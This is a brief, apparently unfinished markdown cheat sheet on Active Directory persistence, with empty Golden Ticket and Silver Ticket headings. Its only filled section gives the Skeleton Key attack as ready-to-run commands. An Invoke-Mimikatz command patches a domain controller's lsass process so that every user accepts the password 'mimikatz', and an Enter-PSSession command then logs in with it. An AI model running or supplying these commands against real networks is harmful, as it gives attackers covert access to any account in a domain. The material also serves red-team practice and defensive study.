## Persistence on Active Directory 

### Golden Ticket



### Silver Ticket


### Skeleton Key
Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
```powershell
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>
```
Access with password `mimikatz`
```powershell
C:> Enter-PSSession -Computername <host> -Credential <domain>\<username>
```
### MORE





